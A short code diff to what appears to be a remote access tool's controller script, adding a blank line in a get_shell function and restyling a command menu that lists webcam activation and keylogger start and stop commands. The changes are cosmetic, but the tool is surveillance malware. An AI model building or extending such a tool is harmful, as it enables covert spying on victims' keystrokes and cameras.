@@ -69,6 +69,7 @@ def get_shell(conn, command):
             break
 
         stdout = conn.recv(1024*1024)
+        
         print(stdout.decode())
 
 def start():
@@ -92,7 +93,7 @@ def start():
             ║╬║╠═║║║║║║║║║║╔╣╬╚╣╔╣  =(o_/=//_(   /====='
             ╚═╩╩═╝╚╩═╩═╩╩╝╚╝╚══╩═╝      ~"` ~"~~` 
             
-                        -- COMMANDS --
+            ---- == ---- === COMMANDS === ---- == ----
             open_webcam  -- active client\'s webcam
             logger_start -- start keylogger
             logger_end   -- stop keylogger and recieved keyslog
